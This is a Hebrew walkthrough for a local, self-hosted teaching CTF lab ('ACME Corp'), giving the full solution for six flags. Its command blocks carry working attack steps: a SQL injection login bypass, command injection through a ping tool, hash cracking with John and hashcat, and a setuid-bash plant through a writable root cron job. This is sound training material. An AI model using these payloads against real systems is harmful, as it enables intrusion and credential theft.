<div dir="rtl">

# 🟢 Walkthrough מלא — ACME Corp (מסלול מודרך)

> ⚠️ **ספוילר!** זהו הפתרון המלא. אם אתה במסלול הריאליסטי — סגור עכשיו ונסה לבד. השתמש בזה רק אחרי שנתקעת, או כמרצה להדגמה בכיתה.

> הרץ בטרמינל נפרד: `python3 acme_range.py`. כל הפקודות למטה מכוונות ל-`127.0.0.1`.

---

## שלב 0 — מיפוי ה-Scope
שלושה "hosts" (פורטים): 8080 (אתר חיצוני), 8081 (אפליקציית staging), 9090 (jumpbox פנימי — חסום בהתחלה).

```bash
for p in 8080 8081 9090; do echo "== :$p =="; curl -s -o /dev/null -w "%{http_code}\n" 127.0.0.1:$p/; done
```

---

## 🔍 שלב 1 — Recon (דגל 1)
כותרות ומקור הדף מדליפים מידע. שים לב ל-`Server: Apache/2.4.49` (גרסה פגיעה ידועה) וב-HTML יש הערת מפתח:

```bash
curl -s -I 127.0.0.1:8080/            # כותרות — שים לב ל-Server
curl -s 127.0.0.1:8080/ | grep -o 'flag{[^}]*}'
curl -s 127.0.0.1:8080/robots.txt     # מגלה /backup/
curl -s 127.0.0.1:8080/backup/x       # מצביע על אפליקציית ה-staging ב-8081
```
**דגל 1:** `flag{recon_source_disclosure}` — מתוך הערת ה-HTML.

---

## 💉 שלב 2 — SQL Injection (דגל 2)
טופס ההתחברות ב-8081 בונה שאילתה ע"י שרשור מחרוזות. נעקוף עם `admin' -- `:

```bash
curl -s -X POST --data "user=admin' -- -&pass=x" 127.0.0.1:8081/login | grep -o 'flag{[^}]*}'
```
**דגל 2:** `flag{sqli_auth_bypass}`. ה-Dashboard חושף שני דברים: ייצוא hashes ב-`/admin/hashes.txt` וכלי ping ב-`/tools/ping`.

---

## 🐚 שלב 3 — Command Injection / RCE (דגל 3)
כלי ה-ping מעביר את ה-host ישר ל-shell. נזריק פקודה עם `;`:

```bash
curl -s "127.0.0.1:8081/tools/ping?host=127.0.0.1;id"        # הוכחת RCE
curl -s "127.0.0.1:8081/tools/ping?host=x;cat%20/tmp/acme_range/user_flag.txt" | grep -o 'flag{[^}]*}'
```
**דגל 3:** `flag{command_injection_rce}`.

---

## 🔑 שלב 4 — Password Cracking → Pivot (דגל 4)
נשלוף את ה-hashes, נפצח offline, ונשתמש בסיסמה כדי לפרוץ פנימה ל-9090.

```bash
curl -s 127.0.0.1:8081/admin/hashes.txt | cut -d: -f2 > emp_hashes.txt
# אלה MD5 — פיצוח עם John:
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt emp_hashes.txt
john --format=raw-md5 --show emp_hashes.txt
#   ... הסיסמה של svc_backup היא:  superman
```
(חלופה: `hashcat -m 0 emp_hashes.txt /usr/share/wordlists/rockyou.txt`)

הסיסמה `superman` היא הטוקן ל-jumpbox הפנימי:
```bash
curl -s "127.0.0.1:9090/?token=superman" | grep -o 'flag{[^}]*}'
```
**דגל 4:** `flag{pivot_internal_access}`. ה-jumpbox חושף: dump של NTLM, משימת cron, ו-DC.

---

## ⬆️ שלב 5 — Privilege Escalation: Writable Cron (דגל 5)
ה-cron רץ כ-root והסקריפט ניתן לכתיבה. נזריק פקודה:

```bash
curl -s 127.0.0.1:9090/cron/backup?token=superman        # רואים שהוא writable + רץ כ-root
curl -s -X POST -H "X-Pivot-Token: superman" \
     --data 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' \
     127.0.0.1:9090/cron/backup | grep -o 'flag{[^}]*}'
```
**דגל 5:** `flag{privesc_writable_cron}` (root הריץ את הפקודה שלנו וחשף את `/root/root.txt`).

---

## 👑 שלב 6 — Active Directory: פיצוח NTLM (דגל 6)
נשלוף את ה-dump ונפצח את ה-hash של Administrator עם `-m 1000`:

```bash
curl -s "127.0.0.1:9090/secrets/ntlm.txt?token=superman"
# שליפת ה-NT hash של Administrator (השדה הרביעי):
curl -s "127.0.0.1:9090/secrets/ntlm.txt?token=superman" | grep Administrator | cut -d: -f4 > admin_nt.txt
hashcat -m 1000 admin_nt.txt /usr/share/wordlists/rockyou.txt
#   58a478135a93ac3bf058a5ea0e8fdb71 : Password123
curl -s "127.0.0.1:9090/dc?token=superman&da=Password123" | grep -o 'flag{[^}]*}'
```
**דגל 6:** `flag{domain_admin_ntlm_crack}` — 👑 Domain Admin.

---

## ✅ אימות ודוח
```bash
python3 scoreboard.py \
  flag{recon_source_disclosure} flag{sqli_auth_bypass} flag{command_injection_rce} \
  flag{pivot_internal_access} flag{privesc_writable_cron} flag{domain_admin_ntlm_crack}
```
6/6. עכשיו מלא את [`findings-template.md`](findings-template.md) והפוך את ההישג לדוח מקצועי.

[⬅️ חזרה לכתב המינוי](README.md)

</div>
